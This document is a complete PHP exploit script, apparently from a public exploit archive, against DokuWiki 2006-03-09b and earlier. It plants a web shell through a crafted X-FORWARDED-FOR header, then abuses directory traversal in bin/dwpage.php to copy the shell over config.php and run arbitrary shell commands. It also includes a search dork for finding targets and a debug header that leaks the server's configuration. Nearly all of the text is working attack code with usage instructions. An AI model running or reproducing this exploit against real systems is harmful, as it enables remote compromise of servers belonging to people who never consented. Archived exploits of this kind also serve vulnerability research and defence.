#!/usr/bin/php -q -d short_open_tag=on
&lt;?
print_r(&#039;
--------------------------------------------------------------------------------
DokuWiki &lt;= 2006-03-09b release /bin/dwpage.php remote commands execution xploit
by rgod rgod@autistici.org
site: http://retrogod.altervista.org
dork: &quot;Driven by DokuWiki&quot;
--------------------------------------------------------------------------------
&#039;);
/*
works with register_argc_argv = On
*/
if ($argc&lt;4) {
print_r(&#039;
--------------------------------------------------------------------------------
Usage: php &#039;.$argv[0].&#039; host path cmd OPTIONS
host:      target server (ip/hostname)
path:      path to dokuwiki
cmd:       a shell command
Options:
 -p[port]:    specify a port other than 80
 -P[ip:port]: specify a proxy
Example:
php &#039;.$argv[0].&#039; localhost /wiki/ ls -la -P1.1.1.1:80
php &#039;.$argv[0].&#039; localhost /wiki/ ls -la -p81
--------------------------------------------------------------------------------
&#039;);
die;
}
/* software site: http://wiki.splitbrain.org/wiki:dokuwiki

   there are some shell scripts in /bin folder and there is no .htaccess to
   protect it: most dangerous one is dwpage.php, if register_argc_argv = On
   it allows to copy/move files among folders because of $TARGET_FN var
   directory traversal, also you can inject a shell by main doku.php script
   sending a malicious X-FORWARDED-FOR http header (but you could do the same
   uploading some file in /data/media folder through /lib/exe/media.php...,
   I choosed the first solution)

   also, I noticed, you can disclose php configuration by
   setting an http header like this calling the main doku.php
   script:

   X-DOKUWIKI-DO: debug

   (debug feature is enabled by default...)
*/

error_reporting(0);
ini_set(&quot;max_execution_time&quot;,0);
ini_set(&quot;default_socket_timeout&quot;,5);

function quick_dump($string)
{
  $result=&#039;&#039;;$exa=&#039;&#039;;$cont=0;
  for ($i=0; $i&lt;=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) &lt;= 32 ) | (ord($string[$i]) &gt; 126 ))
   {$result.=&quot;  .&quot;;}
   else
   {$result.=&quot;  &quot;.$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=&quot; &quot;.dechex(ord($string[$i]));}
   else
   {$exa.=&quot; 0&quot;.dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.=&quot;\r\n&quot;; $exa.=&quot;\r\n&quot;;}
  }
 return $exa.&quot;\r\n&quot;.$result;
}
$proxy_regex = &#039;(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)&#039;;
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy==&#039;&#039;) {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo &#039;No response from &#039;.$host.&#039;:&#039;.$port; die;
    }
  }
  else {
   $c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo &#039;Not a valid proxy...&#039;;die;
    }
    $parts=explode(&#039;:&#039;,$proxy);
    echo &quot;Connecting to &quot;.$parts[0].&quot;:&quot;.$parts[1].&quot; proxy...\r\n&quot;;
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo &#039;No response from proxy...&#039;;die;
   }
  }
  fputs($ock,$packet);
  if ($proxy==&#039;&#039;) {
    $html=&#039;&#039;;
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html=&#039;&#039;;
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
  #debug
  #echo &quot;\r\n&quot;.$html;
}

$host=$argv[1];
$path=$argv[2];
$cmd=&quot;&quot;;
$port=80;
$proxy=&quot;&quot;;
for ($i=3; $i&lt;$argc; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp&lt;&gt;&quot;-p&quot;) and ($temp&lt;&gt;&quot;-P&quot;)) {$cmd.=&quot; &quot;.$argv[$i];}
if ($temp==&quot;-p&quot;)
{
  $port=str_replace(&quot;-p&quot;,&quot;&quot;,$argv[$i]);
}
if ($temp==&quot;-P&quot;)
{
  $proxy=str_replace(&quot;-P&quot;,&quot;&quot;,$argv[$i]);
}
}
if (($path[0]&lt;&gt;&#039;/&#039;) or ($path[strlen($path)-1]&lt;&gt;&#039;/&#039;)) {echo &#039;Error... check the path!&#039;; die;}
if ($proxy==&#039;&#039;) {$p=$path;} else {$p=&#039;http://&#039;.$host.&#039;:&#039;.$port.$path;}

//create /data/pages/suntzu.txt.lock and inject the shell code
$data=&quot;do=edit&amp;rev=&amp;id=suntzu&quot;;
$packet=&quot;POST &quot;.$p.&quot;doku.php HTTP/1.0\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;X-FORWARDED-FOR: &lt;?php set_time_limit(0);echo &#039;my_delim&#039;;passthru(\$_SERVER[&#039;HTTP_CLIENT_IP&#039;]);die;?&gt;\r\n&quot;;
$packet.=&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
$packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
$packet.=$data;
sendpacketii($packet);
sleep(1);

//copy /data/pages/suntzu.txt.lock to /data/pages/wiki/suntzu.txt
$packet=&quot;GET &quot;.$p.&quot;bin/dwpage.php?-m+\&quot;suntzu\&quot;+commit+../data/pages/suntzu.txt.lock+wiki:suntzu HTTP/1.0\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
sendpacketii($packet);
sleep(1);

//copy /data/pages/wiki/suntzu.txt to config.php inside main folder
$packet=&quot;GET &quot;.$p.&quot;bin/dwpage.php?-m+\&quot;suntzu\&quot;+checkout+wiki:suntzu+../config.php HTTP/1.0\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
sendpacketii($packet);
sleep(1);

//launch commands...
$packet=&quot;GET &quot;.$p.&quot;config.php HTTP/1.0\r\n&quot;;
$packet.=&quot;CLIENT-IP: $cmd\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
sendpacketii($packet);
if (strstr($html,&quot;my_delim&quot;)){echo &quot;exploit succeeded...\r\n&quot;;$temp=explode(&quot;my_delim&quot;,$html);die($temp[1]);}
else { echo &quot;exploit failed...\r\n&quot;;}
?&gt;
